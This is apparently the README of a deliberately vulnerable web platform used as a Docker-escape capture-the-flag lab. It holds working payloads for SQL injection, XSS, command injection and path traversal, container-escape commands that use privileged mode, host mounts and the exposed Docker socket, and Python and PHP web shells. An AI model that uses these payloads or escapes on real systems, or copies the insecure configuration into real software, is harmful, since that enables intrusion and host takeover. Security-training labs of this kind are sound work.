# 🔓 Vulnerable Web Platform - Docker Escape Challenge

## ⚠️ WARNING
**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES!**

- **DO NOT** deploy this in any production environment
- **DO NOT** expose this to the internet
- Use **ONLY** in isolated, controlled environments
- For **educational and testing purposes ONLY**

## 📋 Overview

This vulnerable web platform is designed for learning web exploitation and Docker escape techniques. It includes multiple intentional vulnerabilities that allow you to:

1. Gain initial access through web vulnerabilities
2. Execute commands on the server
3. Escalate privileges
4. Escape the Docker container
5. Access the host system

## 🎯 Challenge Objectives

### Level 1: Initial Access
- [ ] Bypass login using SQL injection
- [ ] Extract database contents
- [ ] Gain admin access

### Level 2: Code Execution
- [ ] Execute commands via command injection
- [ ] Upload a web shell
- [ ] Read sensitive files

### Level 3: Container Compromise
- [ ] Confirm you're in a Docker container
- [ ] Enumerate container environment
- [ ] Find privilege escalation vectors

### Level 4: Docker Escape
- [ ] Identify Docker escape opportunities
- [ ] Exploit misconfigured Docker setup
- [ ] Access the host filesystem
- [ ] Execute commands on the host system

## 🚀 Quick Start

### Prerequisites
- Docker and Docker Compose installed
- Basic understanding of web vulnerabilities
- Linux command line knowledge

### Installation

1. **Clone or navigate to the directory:**
   ```bash
   cd vulnerable-platform
   ```

2. **Build and start the container:**
   ```bash
   docker-compose up -d --build
   ```

3. **Access the application:**
   ```
   http://localhost:5000
   ```

4. **Stop the container:**
   ```bash
   docker-compose down
   ```

## 🔐 Default Credentials

- **Admin:** `admin / admin123`
- **User:** `user / password`
- **Guest:** `guest / guest123`

## 🐛 Vulnerabilities Included

### 1. SQL Injection (Login & Search)
**Location:** `/login`, `/search`

**Description:** Direct string concatenation in SQL queries allows authentication bypass and data extraction.

**Exploitation Examples:**
```
Username: admin' OR '1'='1' --
Username: admin'--
Search: ' UNION SELECT username, password, email, 1 FROM users--
```

### 2. Cross-Site Scripting (XSS)
**Location:** `/post/<id>`, Comments

**Types:**
- Reflected XSS via URL parameters
- Stored XSS in comments

**Exploitation Examples:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### 3. Command Injection
**Location:** `/ping`

**Description:** Unsanitized user input passed to shell commands.

**Exploitation Examples:**
```
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la /
127.0.0.1; cat /flag.txt
```

### 4. Unrestricted File Upload
**Location:** `/upload`

**Description:** No file type, size, or content validation.

**Exploitation:** Upload web shells, reverse shells, or malicious files.

### 5. Path Traversal
**Location:** `/download`

**Description:** No path sanitization in file download functionality.

**Exploitation Examples:**
```
?file=../../../../etc/passwd
?file=../../../../flag.txt
?file=../../../../proc/self/cgroup
```

### 6. Broken Access Control
**Location:** `/admin`

**Description:** Authentication check relies only on session variables that can be manipulated.

**Exploitation:** After SQL injection login, session may have admin privileges.

### 7. Insecure Deserialization
**Location:** `/serialize`

**Description:** Python pickle deserialization without validation.

**Exploitation:** Create malicious pickle payloads for code execution.

## 🐳 Docker Escape Techniques

The Docker setup includes multiple intentional misconfigurations:

### 1. Privileged Mode
```yaml
privileged: true
```
**Impact:** Disables security features, grants full access to host devices.

**Exploitation:**
```bash
# From inside container
fdisk -l  # List host disks
mkdir /mnt/host
mount /dev/sda1 /mnt/host
ls /mnt/host
```

### 2. Host Filesystem Mount
```yaml
volumes:
  - /:/host
```
**Impact:** Entire host filesystem accessible at `/host`.

**Exploitation:**
```bash
# From inside container
ls /host
cat /host/etc/passwd
cat /host/root/.bash_history
```

### 3. Docker Socket Exposed
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock
```
**Impact:** Container can control Docker daemon.

**Exploitation:**
```bash
# Install Docker CLI in container (if not present)
apt-get update && apt-get install -y docker.io

# List containers
docker ps

# Create privileged container with host filesystem
docker run -v /:/host -it alpine sh

# Access host filesystem
chroot /host
```

### 4. Dangerous Capabilities
```yaml
cap_add:
  - SYS_ADMIN
  - SYS_PTRACE
  - SYS_MODULE
```
**Impact:** Allows mounting, process tracing, and kernel module loading.

### 5. Security Options Disabled
```yaml
security_opt:
  - seccomp:unconfined
  - apparmor:unconfined
```
**Impact:** Removes syscall and access control restrictions.

## 🎓 Learning Path

### Beginner Track
1. Start with SQL injection on login page
2. Try XSS in comments
3. Use command injection to explore the container
4. Upload a simple text file

### Intermediate Track
1. Extract all user credentials via SQL injection
2. Gain admin access
3. Execute complex commands
4. Upload a web shell (Python/PHP)
5. Identify Docker environment indicators

### Advanced Track
1. Enumerate Docker configuration
2. Exploit privileged mode
3. Access host filesystem via mount
4. Use Docker socket to spawn privileged container
5. Achieve full host compromise

## 📚 Exploitation Cheat Sheet

### Confirm Docker Environment
```bash
# Check if in container
cat /proc/1/cgroup
ls -la /.dockerenv
cat /proc/self/mountinfo | grep docker

# Check capabilities
capsh --print

# Check mounts
mount | grep docker
df -h
```

### Basic Container Escape (Privileged + Host Mount)
```bash
# If /host is mounted
chroot /host /bin/bash
cat /host/root/flag.txt
```

### Docker Socket Escape
```bash
# Install Docker CLI
curl -fsSL https://get.docker.com -o get-docker.sh
sh get-docker.sh

# Or use existing docker binary
docker ps
docker run -v /:/hostfs --privileged alpine sh -c "chroot /hostfs bash"
```

### Web Shell Examples

**Python Web Shell (webshell.py):**
```python
#!/usr/bin/env python3
import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd', 'whoami')
    result = subprocess.check_output(cmd, shell=True)
    return f'<pre>{result.decode()}</pre>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**Simple PHP Shell:**
```php
<?php system($_GET['cmd']); ?>
```

## 🏁 Flags to Capture

1. **FLAG{sql_injection_master}** - Found in database via SQL injection
2. **FLAG{admin_access_granted}** - Displayed on admin panel
3. **FLAG{unrestricted_upload_pwned}** - Shown after file upload
4. **FLAG{you_are_inside_the_container}** - Located at `/flag.txt`
5. **FLAG{docker_escape_successful_you_are_now_on_host}** - Found on host system

## 🔧 Troubleshooting

### Container won't start
```bash
docker-compose down
docker-compose up --build
```

### Can't access application
```bash
# Check if container is running
docker ps

# Check logs
docker logs vulnerable-platform

# Verify port is not in use
lsof -i :5000
```

### Permission issues
```bash
# Ensure Docker daemon is running
sudo systemctl start docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker
```

## 📖 Additional Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Docker Security Best Practices: https://docs.docker.com/engine/security/
- Container Escape Techniques: Research papers and security blogs
- Web Security Academy: https://portswigger.net/web-security

## ⚖️ Legal Disclaimer

This platform is provided for **educational purposes only**. Users are responsible for:
- Using this software legally and ethically
- Ensuring proper isolation and security of their testing environment
- Not using these techniques against systems without explicit authorization
- Complying with all applicable laws and regulations

**Unauthorized access to computer systems is illegal.**

## 🤝 Contributing

This is an educational project. Suggestions for additional vulnerabilities or improvements are welcome.

## 📝 License

This project is provided as-is for educational purposes. Use at your own risk.

---

**Remember:** With great power comes great responsibility. Use this knowledge ethically! 🛡️
